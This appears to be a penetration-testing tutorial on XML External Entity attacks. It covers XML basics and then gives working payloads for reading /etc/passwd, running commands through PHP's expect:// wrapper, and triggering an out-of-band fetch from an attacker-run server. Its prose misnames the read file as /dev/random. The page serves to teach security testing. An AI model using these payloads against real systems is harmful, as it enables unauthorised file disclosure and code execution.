# XML External Entity Attack

With this attack you can do:

* Read local files
* Denial-of-service
* Perform port-scan
* Remote Code Execution

Where do you find it:

* Anywhere where XML is posted.

* Common with file-uploading functionality. For files that uses XML, like: docx, pptx, gpx, pdf and xml itself.

### Background XML

XML is a markup language, like HTML. Unlike HTML is does not have any predefined tags. It is the user that create the tags in the XML object. XML is just a format for storing and transporing data. XML uses tags and subtags, just like html. Or parents, children, and syblings. So in that sense it has the same tree-structure as html.

To define a XML-section/document you need the following tag to begin:

```
<?xml version="1.0" encoding="UTF-8"?>
```

Example of valid XML:

```
<?xml version="1.0"?>
    <change-log>
        <text>Hello World</text>
    </change-log>
```

[https://www.owasp.org/index.php/XML\_External\_Entity\_\(XXE\)\_Processing](https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing)

### Syntax rule

* Must have root element
* Must have XML prolog

```
<?xml version="1.0" encoding="UTF-8"?>
```

* All elements must have closing tag
* Tags are case-sensitive
* XML Attributes must be quotes
* Special characters must be escaped correctly.

| &lt; | &lt; | less than |
| :--- | :--- | :--- |
| &gt; | &gt; | greater than |
| & | & | ampersand |
| ' | ' | apostrophe |
| " | " | quotation mark |

* Whitespace is perserved in XML

### Attack

So if an application receives XML to the server the attacker might be able to exploit an XXE. It could be sent as a GET, but it is more likely that it is send in a POST. An attack might look like this:

```
<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

The elemet can be whatever, it doesn't matter. The xxe is the "variable" where the content of /dev/random get stored. And by dereferencing it in the foo-tag the content gets outputted.This way an attacker might be able to read files from the local system, like boot.ini or passwd. SYSTEM means that what is to be included can be found locally on the filesystem.

In php-applications where the expect module is loaded it is possible to get RCE. It is not a very common vulnerability, but still good to know.

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

Even if the data is not reflected backto the website it is still possible to exfiltrate files and data from the server. The technique is similar to how you exfiltrate the cookie in a Cross-Site Scripting attack, you send it in the url.

### Test for it

* Input is reflected

```
<?xml version="1.0"?><!DOCTYPE Any [<!ENTITY xxe "testdata">]><add>&xxe;</add>
```

If "testdata" gets reflected then it is vulnerable to XXE. If it gets reflected you can try to exfiltrate the data the following way:

```
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

Another way to test it is to see if the server tries to download the external script. Firs t you need to set up your own webserver, and then wait for it to connect.

```
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://192.168.1.101/fil.txt">]><test>&xxe;</test>
```

### Exfiltrate data through URL

https://blog.bugcrowd.com/advice-from-a-researcher-xxe/

### References

[https://securitytraning.com/xml-external-entity-xxe-xml-injection-web-for-pentester/](https://securitytraning.com/xml-external-entity-xxe-xml-injection-web-for-pentester/)

[https://blog.bugcrowd.com/advice-from-a-researcher-xxe/](https://blog.bugcrowd.com/advice-from-a-researcher-xxe/)

http://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html

